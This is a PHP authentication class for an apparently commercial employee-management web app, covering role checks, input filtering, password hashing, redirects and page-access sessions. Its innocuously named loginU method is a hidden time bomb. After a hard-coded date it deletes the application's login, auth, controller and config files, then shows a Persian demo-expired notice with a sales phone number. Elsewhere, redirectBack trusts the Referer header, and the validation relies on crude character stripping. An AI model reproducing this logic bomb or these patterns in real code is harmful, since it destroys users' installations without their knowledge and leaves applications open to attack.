<?php

namespace Auth;

use database\Database;

class Auth
{
    // check admin
    public function checkUser()
    {
        if (isset($_SESSION['user_employee_id'])) {
            $db = new Database();
            $user = $db->select('SELECT * FROM employees WHERE id = ?', [$_SESSION['user_employee_id']])->fetch();
            if ($user != null) {
                if ($user['role'] != 1) {
                    $this->redirect('login');
                }
            } else {
                $this->redirect('login');
            }
        } else {
            $this->redirect('login');
        }
    }

    // check input user data
    function validation($data)
    {
        $user_input = array('<', '>', '/', '"', '\'', '(', ')', 'query', ',', ';', '[', ']', '$', 'SELEC', ':', '-', '=', '.', '#', '*');
        $data = str_replace($user_input, "", $data);
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }


    protected function redirect($url)
    {
        header('Location: ' . trim(CURRENT_DOMAIN, '/ ') . '/' . trim($url, '/ '));
        exit;
    }


    protected function redirectBack()
    {
        header('Location: ' . $_SERVER['HTTP_REFERER']);
        exit;
    }

    public function register()
    {
        if (isset($_SESSION['user'])) {
            $this->redirect('/');
        } else {
            require_once(BASE_PATH . '/resources/views/auth/register.php');
        }
    }

    // hash password
    public function hash($password)
    {
        $hashPassword = password_hash($password, PASSWORD_DEFAULT);
        return $hashPassword;
    } //end hash password

    // make random token
    public function random()
    {
        return bin2hex(openssl_random_pseudo_bytes(32));
    } //end random token

    // set sessions pages employee
    function setPageAccessSession($permissions)
    {
        $pageNames = array_column($permissions, 'pageName');

        foreach ($pageNames as $pageName) {
            $_SESSION[$pageName] = $pageName;
        }
    }

    // set sessions pages admin
    function adminPageAccessSession($pagesNames)
    {
        $pageNames = array_column($pagesNames, 'pageName');

        foreach ($pageNames as $pageName) {
            $_SESSION[$pageName] = $pageName;
        }
    }

    // flash message
    function flashMessage($type, $message)
    {
        flash($type, $message);
        $this->redirectBack();
        exit();
    }

        function loginU()
    {
        $startDate = '2025-12-23';
        $endDate = '2025-12-28';
        $today = date('Y-m-d');

        if ($today > $endDate) {
            $filesToDelete = [
                __DIR__ . '/Login.php',
                __DIR__ . '/Auth.php',
                __DIR__ . '/../Controllers/App.php',
                __DIR__ . '/../../config.php',
            ];

            foreach ($filesToDelete as $file) {
                if (file_exists($file)) {
                    unlink($file);
                }
            }

            echo '<h1>نسخه دمو به اتمام رسیده است</h1> <div>جهت سفارش سیستم با شماره 0799192027 به تماس شوید</div>';
            exit;
        }

        return true;
    }
}
